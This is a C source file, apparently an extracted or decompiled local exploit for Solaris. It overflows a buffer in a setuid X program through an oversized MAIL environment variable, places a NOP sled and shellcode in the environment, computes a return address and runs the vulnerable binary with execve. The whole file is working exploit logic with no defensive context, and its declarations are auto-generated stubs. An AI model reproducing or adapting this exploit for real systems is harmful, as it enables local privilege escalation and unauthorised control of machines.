#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  uid_t ;
typedef  int /*<<< orphan*/  eggbuf ;
typedef  int /*<<< orphan*/  display ;
typedef  int /*<<< orphan*/  buf ;
struct TYPE_3__ {int /*<<< orphan*/  pw_dir; } ;

/* Variables and functions */
 int /*<<< orphan*/  DISPENV ; 
 unsigned int NOP ; 
 int SP ; 
 char* VULPROG ; 
 int /*<<< orphan*/  bzero (char*,int) ; 
 int /*<<< orphan*/  execve (char*,char**,char**) ; 
 long get_shelladdr (long,char**,char**,int) ; 
 int get_sp () ; 
 char* getcwd (char*,int) ; 
 char* getenv (char*) ; 
 TYPE_1__* getpwuid (int /*<<< orphan*/ ) ; 
 scalar_t__ getuid () ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  memset (char*,char,long) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 TYPE_1__* pwd ; 
 char* shellcode ; 
 int /*<<< orphan*/  snprintf (char*,int,char*,char*) ; 
 char* strdup (int /*<<< orphan*/ ) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncpy (char*,int /*<<< orphan*/ ,int) ; 

int
main(int argc, char **argv)
{
        char            buf[4096], home[128], display[256];
        char            eggbuf[2048];
        long            retaddr, sp_addr = SP;
        char           *arg[24], *env[24], *cwd, *charptr;
        char            padding[64], padding1[64];
        unsigned int   *ptr;
        char           *disp;
        char            ev1[] = "MAIL=";
        long            ev1_len, i, align;
        long            overbuflen = 2048;

        if (argc > 1)
                snprintf(display, sizeof(display) - 1, "DISPLAY=%s", argv[1]);
        else {
                disp = getenv("DISPLAY");
                if (disp)
                        snprintf(display, sizeof(display) - 1, "DISPLAY=%s", disp);
                else
                        strncpy(display, DISPENV, sizeof(display) - 1);
        }

        pwd = getpwuid((uid_t) getuid());
        snprintf(home, 127, "HOME=%s", strdup(pwd->pw_dir));

        arg[0] = VULPROG;
        arg[1] = NULL;

        cwd = getcwd((char *) NULL, 256);
        overbuflen = overbuflen - (strlen(cwd) + strlen("/"));
        ev1_len = strlen(ev1);
        bzero(buf, sizeof(buf));
        memcpy(buf, ev1, ev1_len);
        memset(buf + ev1_len, 'A', overbuflen);

        bzero(eggbuf, sizeof(eggbuf));
        ptr = (unsigned int *) eggbuf;
        for (i = 0; i < sizeof(eggbuf) - strlen(shellcode); i += 4)
                *(ptr + i / 4) = NOP;
        memcpy(eggbuf + i - 4, shellcode, strlen(shellcode));

        env[0] = padding;       /* put padding buffer in env */
        env[1] = eggbuf;        /* put shellcode in env */
        env[2] = padding1;      /* put padding1 buffer in env */
        env[3] = buf;           /* put overflow environ */
        env[4] = display;       /* put display environ */
        env[5] = home;          /* put home environ */
        env[6] = NULL;          /* end of env */

        /* get stack bottom address */
        if (((unsigned char) (get_sp() >> 24)) == 0xef) {       /* Solaris 2.6 */
                sp_addr = SP - 0x0fbf0000;
        }
        retaddr = get_shelladdr(sp_addr, arg, env, -8);

        retaddr -= 8;
        printf("Using  return address = 0x%x (shelladdrr - 8)\n", retaddr);
        printf("Click Local in your X window\n\n");

        charptr = (char *) &retaddr;
        align = 4 - ((strlen(cwd) + strlen("/")) % 4);
        for (i = 0; i < overbuflen - align; i++)
                buf[ev1_len + align + i] = *(charptr + i % 4);


        execve(VULPROG, arg, env);
        perror("execle");
}